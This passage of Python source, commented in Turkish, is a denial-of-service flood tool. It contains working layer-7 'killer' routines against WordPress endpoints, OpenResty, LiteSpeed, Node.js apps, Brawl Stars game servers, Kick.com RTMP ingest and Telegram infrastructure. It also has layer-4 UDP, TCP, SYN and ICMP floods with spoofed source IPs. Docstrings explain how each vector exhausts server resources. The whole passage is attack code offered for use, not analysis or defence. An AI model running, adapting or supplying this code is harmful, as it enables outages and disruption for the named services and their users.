                    req = (f"GET /?s={q} HTTP/1.1\r\nHost: {t.auth}\r\n"
                           f"User-Agent: {rua()}\r\nAccept: text/html\r\n\r\n").encode()
                    if not send(s, req): break

            elif mode == 2:  # xmlrpc flood
                body = (f'<?xml version="1.0"?><methodCall>'
                        f'<methodName>wp.getUsersBlogs</methodName><params>'
                        f'<param><value><string>{rstr(8)}</string></value></param>'
                        f'<param><value><string>{rstr(12)}</string></value></param>'
                        f'</params></methodCall>')
                req  = (f"POST /xmlrpc.php HTTP/1.1\r\nHost: {t.auth}\r\n"
                        f"User-Agent: {rua()}\r\nContent-Type: text/xml\r\n"
                        f"Content-Length: {len(body)}\r\n\r\n{body}").encode()
                for _ in range(rpc):
                    if _stop.is_set() or not send(s, req): break

            elif mode == 3:  # REST API search
                for _ in range(rpc):
                    if _stop.is_set(): break
                    q   = rstr(rint(3, 8))
                    req = (f"GET /wp-json/wp/v2/posts?search={q}&_={rint(0,9999999)} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\nUser-Agent: {rua()}\r\n"
                           f"Accept: application/json\r\n\r\n").encode()
                    if not send(s, req): break

            elif mode == 4:  # admin-ajax heartbeat (WP session + options yükü)
                for _ in range(rpc):
                    if _stop.is_set(): break
                    nonce  = rstr(10)
                    action = random.choice(_ACTIONS)
                    body   = f"action={action}&_nonce={nonce}&interval=15"
                    req    = (f"POST /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: {t.auth}\r\n"
                              f"User-Agent: {rua()}\r\n"
                              f"Content-Type: application/x-www-form-urlencoded\r\n"
                              f"Content-Length: {len(body)}\r\n\r\n{body}").encode()
                    if not send(s, req): break

            elif mode == 5:  # preview — tam WP bootstrap, cache bypass
                for _ in range(rpc):
                    if _stop.is_set(): break
                    req = (f"GET /?p={rint(1,9999)}&preview=true HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\nUser-Agent: {rua()}\r\n"
                           f"Accept: text/html\r\n\r\n").encode()
                    if not send(s, req): break

            elif mode == 6:  # wp-comments-post — antispam + DB insert
                for _ in range(rpc):
                    if _stop.is_set(): break
                    body = (f"comment={rstr(200)}&author={rstr(6)}"
                            f"&email={rstr(8)}%40mail.com&url="
                            f"&submit=Post+Comment"
                            f"&comment_post_ID={rint(1,100)}&comment_parent=0")
                    req  = (f"POST /wp-comments-post.php HTTP/1.1\r\nHost: {t.auth}\r\n"
                            f"User-Agent: {rua()}\r\n"
                            f"Referer: {t.scheme}://{t.host}/?p={rint(1,100)}\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Content-Length: {len(body)}\r\n\r\n{body}").encode()
                    if not send(s, req): break

            else:            # RSS feed — DB query + XML generate
                for _ in range(rpc):
                    if _stop.is_set(): break
                    req = (f"GET /?cat={rint(1,50)}&feed=rss2 HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\nUser-Agent: {rua()}\r\n"
                           f"Accept: application/rss+xml,*/*\r\n\r\n").encode()
                    if not send(s, req): break

            with _lock: SENT[0] += rpc
            close(s)

# ── OPENRESTY_KILLER ──────────────────────────────────────────────────────────
def w_OPENRESTY_KILLER(t, rpc):
    """
    OpenResty (nginx+LuaJIT) çok-vektör L7 flood.

    Teknik 1 — Lua shared dict thrash (35%):
      Benzersiz path+query → ngx.shared.dict her istek miss → LuaJIT JIT kodu soğur.
      Cache-Control: no-cache + Pragma: no-cache → proxy_cache bypass garantisi.

    Teknik 2 — Sub-request amplifikasyon (30%):
      /api/, /_/, /proxy/ gibi Lua ngx.location.capture tetikleyen path'lar.
      Her dış istek Lua içinde 2-4 iç sub-request açar → CPU 2-4x çarpanı.

    Teknik 3 — Header table flood (20%):
      16 benzersiz X- header → ngx.req.get_headers() çıktısı büyür, her
      Lua middleware O(n) iterasyon yapar; LuaJIT trace derleme eşiği aşılmaz.

    Teknik 4 — HTTP/1.1 pipeline + Lua coroutine (15%):
      Pipelined istekler → her biri ayrı Lua coroutine açar; ngx.sleep(0)
      barrier yoksa worker thread işlem sırası bozulur → throughput düşer.
    """
    _SUB_PATHS = [
        '/api/', '/api/v1/', '/api/v2/', '/api/check', '/api/health',
        '/_/', '/_/health', '/_/ready', '/_/status',
        '/proxy/', '/proxy/check', '/internal/', '/internal/health',
        '/rpc/', '/rpc/ping', '/service/', '/service/status',
    ]
    while not _stop.is_set():
        with suppress(Exception):
            s   = t.conn(8)
            role = rint(0, 9)

            if role < 4:  # Lua shared dict thrash
                for _ in range(rpc):
                    if _stop.is_set(): break
                    bust = f"?_lua={rstr(12)}&ts={rint(0,9999999)}&v={rstr(4)}"
                    hdrs = ''.join(f"X-Lua-{rstr(6).capitalize()}: {rstr(16)}\r\n" for _ in range(4))
                    req  = (f"GET {t.path}{bust} HTTP/1.1\r\n"
                            f"Host: {t.auth}\r\n"
                            f"User-Agent: {rua()}\r\n"
                            f"Cache-Control: no-cache, no-store\r\n"
                            f"Pragma: no-cache\r\n"
                            f"Accept: text/html,*/*;q=0.9\r\n"
                            f"Accept-Encoding: gzip, deflate\r\n"
                            f"Connection: keep-alive\r\n"
                            + hdrs + "\r\n").encode()
                    if not send(s, req): break

            elif role < 7:  # Sub-request amplifikasyon
                for _ in range(rpc):
                    if _stop.is_set(): break
                    path = random.choice(_SUB_PATHS) + rstr(8)
                    req  = (f"GET {path}?r={rstr(10)} HTTP/1.1\r\n"
                            f"Host: {t.auth}\r\n"
                            f"User-Agent: {rua()}\r\n"
                            f"X-Real-IP: {rip()}\r\n"
                            f"X-Forwarded-For: {rip()}\r\n"
                            f"Accept: application/json,*/*\r\n"
                            f"Cache-Control: no-cache\r\n"
                            f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            elif role < 9:  # Header table flood (16 custom header)
                for _ in range(rpc):
                    if _stop.is_set(): break
                    hdrs = ''.join(f"X-{rstr(8).capitalize()}-{rstr(4).capitalize()}: {rstr(24)}\r\n"
                                   for _ in range(16))
                    req  = (f"GET {t.path}?h={rstr(8)} HTTP/1.1\r\n"
                            f"Host: {t.auth}\r\n"
                            f"User-Agent: {rua()}\r\n"
                            f"Accept: */*\r\n"
                            f"Connection: keep-alive\r\n"
                            + hdrs + "\r\n").encode()
                    if not send(s, req): break

            else:  # HTTP/1.1 pipeline → Lua coroutine burst
                req = (f"GET {t.path}?p={rstr(6)} HTTP/1.1\r\n"
                       f"Host: {t.auth}\r\n"
                       f"User-Agent: {rua()}\r\n"
                       f"Accept: */*\r\n"
                       f"Connection: keep-alive\r\n\r\n")
                pipeline = req.encode() * rpc
                send(s, pipeline)
                with _lock: SENT[0] += rpc; BYTES[0] += len(pipeline)
                close(s)
                continue

            close(s)


# ── LITESPEED_KILLER ───────────────────────────────────────────────────────────
def w_LITESPEED_KILLER(t, rpc):
    """
    LiteSpeed Web Server çok-vektör L7 flood.

    Teknik 1 — LSCache purge + yeniden doğrulama döngüsü (35%):
      X-LiteSpeed-Purge + ardından GET → cache worker invalidation + rebuild.
      Her döngü sunucuyu tam içerik üretmeye zorlar; cache miss garantilidir.

    Teknik 2 — LSAPI worker tüketimi (30%):
      PHP/app endpoint'e eş zamanlı istek → her istek LSAPI worker process açar.
      Max worker'a ulaşınca yeni istekler queue'da bekler → latency patlar.

    Teknik 3 — Rewrite kural zinciri (20%):
      Karmaşık path + çok sayıda query param → .htaccess PCRE rewrite engine
      tüm kural setini baştan sona tarar; her regex ayrı eval maliyet taşır.

    Teknik 4 — Cache conditional miss: Vary çeşitliliği (15%):
      Accept-Language + Accept-Encoding kombinasyon rotasyonu → LiteSpeed cache
      her varyant için ayrı nesne oluşturur; segment sayısı patlar, bellek dolar.
    """
    _LSAPI_PATHS = [
        '/wp-login.php', '/wp-admin/admin-ajax.php', '/index.php',
        '/checkout/', '/cart/', '/my-account/', '/register/',
        '/api/index.php', '/app/index.php',
    ]
    _LANGS = ['en-US,en;q=0.9', 'tr-TR,tr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9',
              'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9', 'ru-RU,ru;q=0.9', 'zh-CN,zh;q=0.9']
    _ENCS  = ['gzip, deflate, br', 'gzip, deflate', 'br', 'gzip', 'deflate', 'identity', '*']

    while not _stop.is_set():
        with suppress(Exception):
            s    = t.conn(8)
            role = rint(0, 9)

            if role < 4:  # LSCache purge + GET döngüsü
                url_path = t.path + f"?ls={rstr(10)}"
                # Sahte PURGE
                purge = (f"GET {url_path} HTTP/1.1\r\n"
                         f"Host: {t.auth}\r\n"
                         f"User-Agent: {rua()}\r\n"
                         f"X-LiteSpeed-Purge: *\r\n"
                         f"X-LiteSpeed-Tag: {rstr(8)}\r\n"
                         f"Cache-Control: no-cache\r\n"
                         f"Connection: keep-alive\r\n\r\n").encode()
                for _ in range(rpc):
                    if _stop.is_set(): break
                    bust = f"?ls={rstr(10)}&nocache={rint(0,9999999)}"
                    get  = (f"GET {t.path}{bust} HTTP/1.1\r\n"
                            f"Host: {t.auth}\r\n"
                            f"User-Agent: {rua()}\r\n"
                            f"Cache-Control: no-cache, no-store\r\n"
                            f"Pragma: no-cache\r\n"
                            f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, purge): break
                    if not send(s, get):   break

            elif role < 7:  # LSAPI worker tüketimi
                lsapi_path = random.choice(_LSAPI_PATHS)
                body = f"action=heartbeat&data={rstr(32)}&ts={rint(0,9999999)}"
                req  = (f"POST {lsapi_path} HTTP/1.1\r\n"
                        f"Host: {t.auth}\r\n"
                        f"User-Agent: {rua()}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                        f"{body}").encode()
                for _ in range(rpc):
                    if _stop.is_set() or not send(s, req): break

            elif role < 9:  # Rewrite kural zinciri
                for _ in range(rpc):
                    if _stop.is_set(): break
                    segs  = '/'.join(rstr(rint(4,10)) for _ in range(rint(3,7)))
                    qstr  = '&'.join(f"{rstr(5)}={rstr(8)}" for _ in range(rint(8,14)))
                    req   = (f"GET /{segs}?{qstr} HTTP/1.1\r\n"
                             f"Host: {t.auth}\r\n"
                             f"User-Agent: {rua()}\r\n"
                             f"Accept: text/html,*/*\r\n"
                             f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            else:  # Vary çeşitliliği — cache segment patlaması
                for _ in range(rpc):
                    if _stop.is_set(): break
                    req = (f"GET {t.path}?v={rstr(8)} HTTP/1.1\r\n"
                           f"Host: {t.auth}\r\n"
                           f"User-Agent: {rua()}\r\n"
                           f"Accept-Language: {random.choice(_LANGS)}\r\n"
                           f"Accept-Encoding: {random.choice(_ENCS)}\r\n"
                           f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                           f"Cache-Control: max-age=0\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            close(s)


# ── NODEJS_KILLER ─────────────────────────────────────────────────────────────
def w_NODEJS_KILLER(t, rpc):
    """
    Node.js / Express / Next.js çok-vektör L7 flood.

    Teknik 1 — Event loop tıkama: büyük JSON POST (30%):
      Content-Length: 256-512 KB JSON → V8 JSON.parse senkron çalışır,
      event loop o süre boyunca başka I/O işleyemez → tüm bağlantılar gecikir.

    Teknik 2 — GraphQL introspection flood (25%):
      __schema + __type iç içe sorgu → resolver zinciri tüm type'ları dolaşır.
      Her sorgu O(schema_size²) işlem; async executor kuyruğu dolar.

    Teknik 3 — SSE / long-poll bağlantı tüketimi (25%):
      /events, /api/stream, /sse endpoint handshake + bağlantıyı açık tut.
      Her SSE bağlantısı: EventEmitter + timer + libuv handle → bellek leak.

    Teknik 4 — Chunked slowloris POST (20%):
      Content-Length: 50-200 MB beyan edilip gövde gönderilmez.
      Express body-parser / raw-body buffer'da bekler; default requestTimeout
      dolana kadar (60-120s) worker slot meşgul kalır.
    """
    _GQL_PATHS = ['/graphql', '/api/graphql', '/v1/graphql', '/gql', '/query']
    _SSE_PATHS = ['/events', '/api/events', '/sse', '/api/stream', '/api/sse',
                  '/stream', '/realtime', '/api/realtime', '/updates', '/api/updates',
                  '/api/live', '/_next/webpack-hmr', '/api/notifications']
    _API_PATHS = ['/api/', '/api/v1/', '/api/v2/', '/api/data', '/api/users',
                  '/api/products', '/api/search', '/_next/data/', '/trpc/']

    _GQL_INTROSPECT = ('{"query":"{__schema{queryType{name}types{name kind fields{'
                       'name type{name kind ofType{name kind}}}}}}"}')
    _GQL_TYPE       = ('{"query":"{__type(name:\\"' + rstr(6) + '\\"){name fields{'
                       'name type{name kind ofType{name kind ofType{name kind}}}}}}"}')

    while not _stop.is_set():
        with suppress(Exception):
            s    = t.conn(10)
            role = rint(0, 9)

            if role < 3:  # Büyük JSON POST → V8 JSON.parse event loop block
                api_path = random.choice(_API_PATHS) + rstr(6)
                for _ in range(rpc):
                    if _stop.is_set(): break
                    # 256 KB - 512 KB arası JSON body
                    sz     = rint(262144, 524288)
                    fields = ','.join(f'"{rstr(8)}":"{rstr(rint(32,128))}"'
                                      for _ in range(sz // 160))
                    body   = '{' + fields + '}'
                    req    = (f"POST {api_path} HTTP/1.1\r\n"
                              f"Host: {t.auth}\r\n"
                              f"User-Agent: {rua()}\r\n"
                              f"Content-Type: application/json\r\n"
                              f"Content-Length: {len(body)}\r\n"
                              f"Accept: application/json\r\n"
                              f"Connection: keep-alive\r\n\r\n"
                              f"{body}").encode()
                    if not send(s, req): break

            elif role < 6:  # GraphQL introspection flood
                gql_path = random.choice(_GQL_PATHS)
                body     = random.choice([_GQL_INTROSPECT, _GQL_TYPE])
                req      = (f"POST {gql_path} HTTP/1.1\r\n"
                            f"Host: {t.auth}\r\n"
                            f"User-Agent: {rua()}\r\n"
                            f"Content-Type: application/json\r\n"
                            f"Content-Length: {len(body)}\r\n"
                            f"Accept: application/json\r\n"
                            f"Connection: keep-alive\r\n\r\n"
                            f"{body}").encode()
                for _ in range(rpc):
                    if _stop.is_set() or not send(s, req): break

            elif role < 9:  # SSE / long-poll bağlantı tüketimi
                sse_path = random.choice(_SSE_PATHS)
                handshake = (f"GET {sse_path} HTTP/1.1\r\n"
                             f"Host: {t.auth}\r\n"
                             f"User-Agent: {rua()}\r\n"
                             f"Accept: text/event-stream\r\n"
                             f"Cache-Control: no-cache\r\n"
                             f"Connection: keep-alive\r\n"
                             f"Last-Event-ID: {rint(0, 999999)}\r\n\r\n").encode()
                send(s, handshake)
                with _lock: SENT[0] += 1
                # SSE bağlantısını rpc*3 saniye aç tut → libuv handle leak
                for _ in range(rpc * 3):
                    if _stop.is_set(): break
                    time.sleep(1)
                    try: s.recv(256)
                    except: break

            else:  # Chunked slowloris POST → body-parser buffer wait
                cl  = rint(50_000_000, 200_000_000)
                req = (f"POST {t.path} HTTP/1.1\r\n"
                       f"Host: {t.auth}\r\n"
                       f"User-Agent: {rua()}\r\n"
                       f"Content-Type: application/json\r\n"
                       f"Content-Length: {cl}\r\n"
                       f"Connection: keep-alive\r\n\r\n").encode()
                send(s, req)
                for _ in range(rpc * 4):
                    if _stop.is_set(): break
                    time.sleep(2)
                    if not send(s, b'{"x":'): break
                with _lock: SENT[0] += 1

            close(s)


# ── BRAWLSTARS_KILLER ─────────────────────────────────────────────────────────
def w_BRAWLSTARS_KILLER(t, rpc):
    """
    Brawl Stars (Supercell) oyun sunucusu UDP protokol flood.
    Hedef: ip:9339 (game server UDP port).

    Supercell binary protokol: [2B msg_type][3B payload_len][2B version][payload]

    Teknik 1 — ClientHello burst (40%):
      Tip 10100 — sunucu her yeni kaynak IP/port için crypto context açar,
      DH anahtar değişimi başlatır → CPU + bellek yükü.

    Teknik 2 — Login flood (35%):
      Tip 10101 — sahte uid + token hash → auth servis yükü, negatif DB sorgusu.

    Teknik 3 — KeepAlive + SessionResume karışımı (15%):
      Tip 10108 / 10113 — var olmayan session tablosu araması.

    Teknik 4 — Büyük payload scatter (10%):
      Tip 10100 + 1024 B random payload → fragment buffer baskısı.

    Root varsa: IP spoof ile raw UDP; root yoksa: normal UDP (hızlı, çalışır).
    """
    _HELLO  = 10100   # 0x2774  client hello
    _LOGIN  = 10101   # 0x2775  login request
    _KALIVE = 10108   # 0x277C  keep alive
    _RESUME = 10113   # 0x2781  session resume

    def _pkt(msg_type, payload=b''):
        return (struct.pack('>H', msg_type)
                + len(payload).to_bytes(3, 'big')
                + struct.pack('>H', 1)
                + payload)

    def _hello():
        p  = struct.pack('>I', 5)          # protocol version
        p += struct.pack('>I', 1)          # key version
        p += os.urandom(32)                # content hash (random → cache miss her seferinde)
        p += struct.pack('>I', rint(1,99)) # major
        p += struct.pack('>I', rint(0,9))  # minor
        p += os.urandom(8)
        return _pkt(_HELLO, p)

    def _login():
        p  = struct.pack('>Q', random.randint(1, 0xFFFFFFFF))  # user id
        p += struct.pack('>I', random.randint(1, 0xFFFF))      # token len hint
        p += os.urandom(20)                                    # token hash
        p += struct.pack('>I', 0)                              # locale
        return _pkt(_LOGIN, p)

    def _keepalive(): return _pkt(_KALIVE, b'')
    def _resume():    return _pkt(_RESUME, os.urandom(16))
    def _scatter():   return _pkt(_HELLO,  os.urandom(rint(256, 1024)))

    host  = t.host
    tport = t.port if t.port not in (80, 443) else 9339
    try:    ip = socket.gethostbyname(host)
    except: ip = host

    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if has_root:
        try:
            rs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            rs.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            with suppress(Exception):
                while not _stop.is_set():
                    role = rint(0, 9)
                    if   role < 4: pkt = _hello()
                    elif role < 7: pkt = _login()
                    elif role < 9: pkt = _keepalive()
                    else:          pkt = _scatter()
                    # UDP + IP header ile spoof
                    sip  = rip()
                    sprt = rint(1024, 65535)
                    udp  = struct.pack('>HHH', sprt, tport, 8 + len(pkt)) + b'\x00\x00' + pkt
                    # checksum hesabı atlanır (kernel IPPROTO_RAW'da doldurur)
                    ip_hdr = (b'\x45\x00'
                              + struct.pack('>H', 20 + len(udp))
                              + os.urandom(2)
                              + b'\x40\x00\x40\x11\x00\x00'
                              + socket.inet_aton(sip)
                              + socket.inet_aton(ip))
                    sndto(rs, ip_hdr + udp, (ip, tport))
            close(rs); return
        except: pass

    # Root yok: normal UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
    with suppress(Exception):
        while not _stop.is_set():
            role = rint(0, 9)
            if   role < 4: pkt = _hello()
            elif role < 7: pkt = _login()
            elif role < 9: pkt = _keepalive()
            else:          pkt = _scatter()
            sndto(s, pkt, (ip, tport))
    close(s)


# ── KICK_KILLER ───────────────────────────────────────────────────────────────
def w_KICK_KILLER(t, rpc):
    """
    Kick.com RTMP ingest sunucusu protokol flood.
    Hedef: ip:1935 (RTMP ingest port).

    RTMP el sıkışması: C0(1B ver=3) + C1(1536B) → S0+S1+S2(3073B) → C2(1536B)
    Sonra: AMF0 connect + createStream + publish → worker tahsisi + auth yükü.

    Teknik 1 — Tam handshake + connect + bağlantı tut (40%):
      Sunucu AMF0 parse eder, session açar; rpc*0.5s bağlantı tutulur →
      RTMP worker/thread tüketimi; yeni stream publisher bağlanamaz.

    Teknik 2 — Handshake + sahte stream key publish (30%):
      connect + createStream + publish rastgele key ile gönderilir →
      stream auth + kayıt tahsisi + ingest allocation yükü.

    Teknik 3 — Yarım el sıkışma slot tüketimi (20%):
      C0+C1 gönderilir, S yanıtı okunmaz, bağlantı açık tutulur →
      RTMP acceptor thread bekleme listesi dolar.

    Teknik 4 — Metadata flood (10%):
      Geçerli handshake + @setDataFrame ile 32 rastgele alan içeren
      dev metadata nesnesi gönderilir → AMF0 parse + heap yükü.
    """

    def _c0c1():
        ts = struct.pack('>I', int(time.time()) & 0xFFFFFFFF)
        return b'\x03' + ts + b'\x00\x00\x00\x00' + os.urandom(1528)

    def _c2(s1):
        # C2: S1'in timestamp + kendi timestamp + S1 random echo
        return s1[:4] + struct.pack('>I', int(time.time()) & 0xFFFFFFFF) + s1[8:]

    def _amf_str(v):
        b = v.encode(); return b'\x02' + struct.pack('>H', len(b)) + b

    def _amf_num(n):
        return b'\x00' + struct.pack('>d', float(n))

    def _chunk(msg_type, payload, csid=3, stream_id=0):
        # Basic header: fmt=0
        bh   = bytes([csid & 0x3F])
        # Message header: timestamp(3) + length(3) + type(1) + stream_id(4 LE)
        mh   = b'\x00\x00\x00' + len(payload).to_bytes(3, 'big') + bytes([msg_type])
        mh  += struct.pack('<I', stream_id)
        return bh + mh + payload

    def _connect_cmd(app='live'):
        body  = _amf_str('connect') + _amf_num(1) + b'\x05'
        obj   = b'\x03'
        obj  += b'\x00\x03app'   + _amf_str(app)
        obj  += b'\x00\x05tcUrl' + _amf_str(f'rtmp://{host}/{app}')
        obj  += b'\x00\x04type'  + _amf_str('nonprivate')
        obj  += b'\x00\x00\x09'
        return _chunk(0x14, body + obj)  # 0x14 = AMF0 command

    def _publish_cmd(key):
        cs  = _amf_str('createStream') + _amf_num(2) + b'\x05'
        pub = _amf_str('publish') + _amf_num(3) + b'\x05' + _amf_str(key) + _amf_str('live')
        return _chunk(0x14, cs) + _chunk(0x14, pub)

    def _metadata_flood():
        cmd  = _amf_str('@setDataFrame') + _amf_str('onMetaData')
        arr  = b'\x08' + struct.pack('>I', 32)   # ECMA array, 32 items
        for _ in range(32):
            k = rstr(rint(4, 10)); v = rstr(rint(16, 48))
            arr += struct.pack('>H', len(k)) + k.encode() + _amf_str(v)
        arr += b'\x00\x00\x09'
        return _chunk(0x12, cmd + arr)  # 0x12 = data message

    def _recv_all(s, n, to=4):
        buf = b''
        dl  = time.time() + to
        while len(buf) < n and time.time() < dl:
            try:
                c = s.recv(n - len(buf))
                if not c: break
                buf += c
            except: break
        return buf

    host  = t.host
    tport = t.port if t.port not in (80, 443) else 1935
    try:    ip = socket.gethostbyname(host)
    except: ip = host

    while not _stop.is_set():
        with suppress(Exception):
            role = rint(0, 9)

            if role < 4:  # Tam handshake + connect + slot tut
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(5)
                try:
                    s.connect((ip, tport))
                    s.sendall(_c0c1()); SENT[0] += 1
                    raw = _recv_all(s, 3073)
                    if len(raw) >= 1537:
                        s.sendall(_c2(raw[1:1537]))
                        s.sendall(_connect_cmd())
                        hold = max(1, rpc // 2)
                        s.settimeout(hold + 1)
                        deadline = time.time() + hold
                        while not _stop.is_set() and time.time() < deadline:
                            try: s.recv(256)
                            except: break
                finally: close(s)

            elif role < 7:  # Handshake + sahte stream key publish
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(5)
                try:
                    s.connect((ip, tport))
                    s.sendall(_c0c1()); SENT[0] += 1
                    raw = _recv_all(s, 3073)
                    if len(raw) >= 1537:
                        s.sendall(_c2(raw[1:1537]))
                        s.sendall(_connect_cmd())
                        s.sendall(_publish_cmd(rstr(20)))
                        time.sleep(1)
                finally: close(s)

            elif role < 9:  # Yarım el sıkışma — acceptor slot tüket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(rpc * 0.3 + 2)
                try:
                    s.connect((ip, tport))
                    s.sendall(_c0c1()); SENT[0] += 1
                    time.sleep(max(1, rpc * 0.3))
                finally: close(s)

            else:  # Metadata flood
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(5)
                try:
                    s.connect((ip, tport))
                    s.sendall(_c0c1()); SENT[0] += 1
                    raw = _recv_all(s, 3073)
                    if len(raw) >= 1537:
                        s.sendall(_c2(raw[1:1537]))
                        s.sendall(_connect_cmd())
                        for _ in range(rpc):
                            if _stop.is_set(): break
                            s.sendall(_metadata_flood())
                finally: close(s)


# ── TELEGRAM_VOICE_KILLER ─────────────────────────────────────────────────────
def w_TELEGRAM_VOICE_KILLER(t, rpc):
    """
    Telegram ses/video çağrı infrastrüktürü çok-vektör L7 flood.

    Teknik 1 — MTProto HTTPS transport tüketimi (35%):
      /api POST → MTProto obfuscation header + rastgele yük; sunucu her
      oturum için AES-256-IGE crypto context + DH anahtar türetimi yapar → CPU yükü.

    Teknik 2 — Bot API long-poll tüketimi (30%):
      /bot{fake_token}/getUpdates?timeout=30 → sahte token, 30s canlı bağlantı.
      Sunucu her token için session tablosuna bakar + slot meşgul kalır.

    Teknik 3 — Medya CDN flood: cache miss zinciri (20%):
      cdn{1-5}.telegram.org/file/{random_hash} → her farklı hash cache miss,
      disk I/O + bant genişliği basıncı; Range: bytes=0- tam dosya çekimini zorlar.

    Teknik 4 — WebRTC sinyal kanalı tüketimi (15%):
      WSS Upgrade handshake + bağlantı aç + WS PING frame'leri →
      ses/video sinyal sunucusu bağlantı havuzunu tüketir.
    """
    _CDN_NODES = [f'cdn{i}.telegram.org' for i in range(1, 6)]
    _WS_PATHS  = ['/ws', '/', '/wss', '/tgcalls', '/voip']

    def _mtproto_payload():
        h = bytearray(os.urandom(64))
        if h[0] in (0xef, 0x44, 0x00, 0xff): h[0] = 0x7e
        return bytes(h) + os.urandom(rint(32, 256))

    while not _stop.is_set():
        with suppress(Exception):
            s    = t.conn(10)
            role = rint(0, 9)

            if role < 4:  # MTProto HTTPS transport
                for _ in range(rpc):
                    if _stop.is_set(): break
                    body = _mtproto_payload()
                    req  = (f"POST /api HTTP/1.1\r\n"
                            f"Host: {t.auth}\r\n"
                            f"User-Agent: TDLib/1.8.{rint(0,25)} TDAPI\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Content-Length: {len(body)}\r\n"
                            f"Connection: keep-alive\r\n\r\n").encode() + body
                    if not send(s, req): break

            elif role < 7:  # Bot API long-poll
                fake_token = f"{rint(1000000000,9999999999)}:{rstr(35)}"
                ep = random.choice([
                    f'/bot{fake_token}/getUpdates?timeout=30&offset=-1',
                    f'/bot{fake_token}/getUpdates?timeout=25',
                    f'/bot{fake_token}/getMe',
                    f'/bot{fake_token}/getWebhookInfo',
                ])
                req = (f"GET {ep} HTTP/1.1\r\n"
                       f"Host: {t.auth}\r\n"
                       f"User-Agent: python-telegram-bot/21.{rint(0,5)}\r\n"
                       f"Accept: application/json\r\n"
                       f"Connection: keep-alive\r\n\r\n").encode()
                send(s, req)
                with _lock: SENT[0] += 1
                for _ in range(min(rpc * 3, 30)):
                    if _stop.is_set(): break
                    time.sleep(1)
                    try: s.recv(256)
                    except: break

            elif role < 9:  # Medya CDN flood
                for _ in range(rpc):
                    if _stop.is_set(): break
                    cdn = random.choice(_CDN_NODES)
                    fid = '/'.join([rstr(12), rstr(8), rstr(16)])
                    req = (f"GET /file/{fid} HTTP/1.1\r\n"
                           f"Host: {cdn}\r\n"
                           f"User-Agent: Telegram/{rint(10,11)}.{rint(0,9)}.{rint(0,9)}\r\n"
                           f"Accept: */*\r\n"
                           f"Range: bytes=0-\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode()
                    if not send(s, req): break

            else:  # WebRTC sinyal kanalı — WS slot tüketimi
                import base64 as _b64
                path = random.choice(_WS_PATHS)
                key  = _b64.b64encode(os.urandom(16)).decode()
                req  = (f"GET {path} HTTP/1.1\r\n"
                        f"Host: {t.auth}\r\n"
                        f"User-Agent: {rua()}\r\n"
                        f"Upgrade: websocket\r\n"
                        f"Connection: Upgrade\r\n"
                        f"Sec-WebSocket-Key: {key}\r\n"
                        f"Sec-WebSocket-Version: 13\r\n"
                        f"Origin: https://web.telegram.org\r\n\r\n").encode()
                send(s, req)
                with _lock: SENT[0] += 1
                for _ in range(rpc * 2):
                    if _stop.is_set(): break
                    time.sleep(1)
                    if not send(s, _ws_frame(0x09, os.urandom(4))): break

            close(s)


# ══════════════════════════════════════════════════════════════════════════════
# L4 METOTLARI
# ══════════════════════════════════════════════════════════════════════════════
def w_UDP(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not _stop.is_set(): sndto(s, os.urandom(1024), (ip,port))
        close(s)

def w_TCP(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(0.9); s.connect((ip,port))
        while not _stop.is_set():
            if not send(s, os.urandom(1024)): break
        close(s)

def w_SYN(host, port, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if not has_root:
        # root yok: TCP bağlantı flood fallback
        w_TCP(host, port); return
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not _stop.is_set(): sndto(s, mk_syn(rip(),ip,port), (ip,0))
        close(s)

def w_ICMP(host, *_):
    try: ip=socket.gethostbyname(host)
    except: ip=host
    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if not has_root:
        # root yok: UDP fallback
        w_UDP(host, 0); return
    with suppress(Exception):
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not _stop.is_set(): sndto(s, mk_icmp(rip(),ip), (ip,0))
